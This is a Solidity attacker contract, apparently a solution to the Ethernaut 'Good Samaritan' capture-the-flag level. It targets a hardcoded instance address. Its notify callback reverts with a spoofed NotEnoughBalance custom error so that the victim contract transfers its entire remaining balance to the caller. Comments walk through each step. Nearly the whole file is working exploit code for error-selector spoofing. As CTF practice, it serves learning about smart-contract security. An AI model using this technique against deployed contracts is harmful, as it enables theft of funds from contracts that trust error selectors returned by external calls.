// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import '../contracts/GoodSamaritan.sol';

// To resolve this callenge I used remix because this compiler only support version 0.8.0
// Version that doesn't support this kind of error declaration

contract HackGoodSamaritan {
    // Complete with the instance's address
    GoodSamaritan originalContract = GoodSamaritan(0xE2c9a62C76018284F35E48286a2A39E95e3Dcc46);
    // Declare this error that it's has the same selector as the one in Wallet contract
    error NotEnoughBalance();

    // Inside the transfer function of Coin contract there's a call for the notify function of the destination address
    // So, this function it's going to be call and We're going to revert with the NotEnoughtBalance error
    // This way, inside the GoodSamaritan contract it's going to be call the transferReminder of Wallet contract
    // This transferReminder calls the same transfer function of the Coin contract
    // The check for the amount <= 10 it's made so the transferReminder wouldn't revert

    function notify(uint256 amount) external {
        if(amount <= 10){
            revert NotEnoughBalance();
        }
    }

    // We execute the function requestDonation
    function hack() public {
        originalContract.requestDonation();
    }

}